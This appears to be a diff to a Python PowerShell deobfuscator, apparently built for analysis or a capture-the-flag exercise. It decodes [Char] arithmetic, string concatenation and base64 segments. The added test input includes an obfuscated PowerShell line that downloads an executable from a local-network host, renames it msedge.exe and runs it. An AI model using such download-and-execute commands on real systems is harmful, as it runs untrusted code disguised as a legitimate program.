@@ -1,4 +1,6 @@
 import re
+import base64
+from urllib.parse import unquote
 
 chrregex = re.compile(r'Chr\(([-]?\d+)(\s+(\^|\+|\-|\/|\*|\%)\s+(\d+))*\)', re.IGNORECASE)
 stringregex = re.compile(r'(".*?"|\'.*?.\')')
@@ -57,9 +59,7 @@ def check_symbols(symbol):
         temp_string = temp_string.replace("temp", chr_substring, 1)
     return temp_string
 
-def concat_test(code):
-    chrregex = re.compile(r'Chr\([^()]*\)', re.IGNORECASE)
-    stringregex = re.compile(r'".*?"')
+def concat_code(code):
     concatregex = re.compile(r'(Chr\([^()]*\)|".*?")(\s*\+\s*(Chr\([^()]*\)|".*?"))*', re.IGNORECASE)
     
     matches = concatregex.finditer(code)
@@ -75,13 +75,27 @@ def concat_test(code):
             else:
                 break
     gabungin = [decode_chr(result) if result.startswith('Chr') else result.strip('"') for result in results]
-    check = code.split('=')
+    splitslashn = [splitslash for splitslash in code.strip().splitlines()]
+    check = []
+    for i in splitslashn:
+        if "+=" in i:
+            check.append(i + '\n')
+            continue
+        parts = i.split('=')
+        for j in range(len(parts)):
+            if j == len(parts) - 1:
+                check.append(parts[j] + '\n')
+            else:
+                check.append(parts[j])
     newcoderes = []
     for i in range(len(check)):
-        newcoderes.append(check_symbols(check[i]))
-        if i != len(check) - 1:
-            newcoderes.append('=')
-    newcode = ''.join([i for i in newcoderes]).strip('\n')
+        if "+=" not in check[i]:
+            newcoderes.append(check_symbols(check[i]))
+            if "\n" not in check[i]:
+                newcoderes.append('=')
+        else:
+            newcoderes.append(check[i])
+    newcode = ''.join([i for i in newcoderes])
     newcode = newcode.replace('"', "").replace("'", "")
     for i, element in enumerate(gabungin):
         if len(element) == 1:
@@ -94,14 +108,77 @@ def Replace(code):
     def replacer(match):
         return match.group(2)
     newcode = pattern.sub(replacer, code)
-    newcode = re.sub(r'=\s*', ' = ', newcode).strip()
+    splitslashn = [splitslash for splitslash in newcode.strip().splitlines()]
+    newcoderes = []
+    for i in range(len(splitslashn)):
+        if "+=" in splitslashn[i]:
+            newcoderes.append(re.sub(r'(\w)\+=\s*(\w)', r'\1 += \2', splitslashn[i]).strip())
+        elif "=" in splitslashn[i]:
+            newcoderes.append(re.sub(r'(?<!\s)=(?!\s)', ' = ', splitslashn[i]).strip())
+    newcode = ''.join([i + '\n' for i in newcoderes])
     return newcode
+
+def decoding(code):
+    match = re.search(r'(?i)B64_decode_([A-Za-z0-9%_=]+)', code)
+    if match:
+        try:
+            encoded = unquote(match.group(1))
+            decoded = base64.b64decode(encoded).decode()
+            code = code.replace(match.group(0), decoded)
+            return code
+        except:
+            return code
+    else:
+        return code
+
+def replace_multiple_variables(code):
+    pattern = r'(\$\w+|\b\w+)\s*=\s*(\S+(\s*=\s*\S+)*)'
+    append_pattern = r'(\$\w+|\b\w+)\s*\+=\s*(\S+)'
+    
+    value_dict = {}
+    
+    for line in code.splitlines():
+        match = re.match(pattern, line)
+        append_match = re.match(append_pattern, line)
+        
+        if match:
+            var, value = match.groups()[0], match.groups()[1]
+            value_dict[var] = value
+        elif append_match:
+            var, value = append_match.groups()
+            if var in value_dict:
+                value_dict[var] += value
+            else:
+                value_dict[var] = value
+    
+    reverse_dict = {}
+    for var, value in value_dict.items():
+        if value in reverse_dict:
+            reverse_dict[value].append(var)
+        else:
+            reverse_dict[value] = [var]
+    
+    newcode = []
+    for value, vars in reverse_dict.items():
+        if len(vars) > 1:
+            newcode.append(" = ".join(vars) + f" = {value}")
+        else:
+            newcode.append(f"{vars[0]} = {value}")
+    
+    for line in code.splitlines():
+        if not re.match(pattern, line) and not re.match(append_pattern, line):
+            newcode.append(line)
+    
+    return "\n".join(newcode)
+
 
 def deobfuscate(code):
     code = char_intended(code)
     code = char_transform(code)
-    code = concat_test(code)
+    code = concat_code(code)
     code = Replace(code)
+    code = decoding(code)
+    code = replace_multiple_variables(code)
     return code
 
 testing = """
@@ -109,6 +186,11 @@ $tes = [Char]        (70) + [Char](-11   +   100) +               [ChAr](99     
 $tes2 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
 $tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
 $tes4 = '[ChaR](99+               13)   +   [CHar](109 -bxor 4)'
-$tes5 = ReplAce('hel'+ ([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo",[ChaR](99+               10)   '+'   [CHar](109 -bxor 4))
+$tes5 = $tessss = ReplAce('hel'+ ([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo",[ChaR](99+               10)   '+'   [CHar](109 -bxor 4))
+$u='ht'+'tp://192.168.0.16:8282/B64_deC'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
+$tes6 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
+$tes7 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
+$tes2 += pe
 """
+# deobfuscate(testing)
 print(deobfuscate(testing))
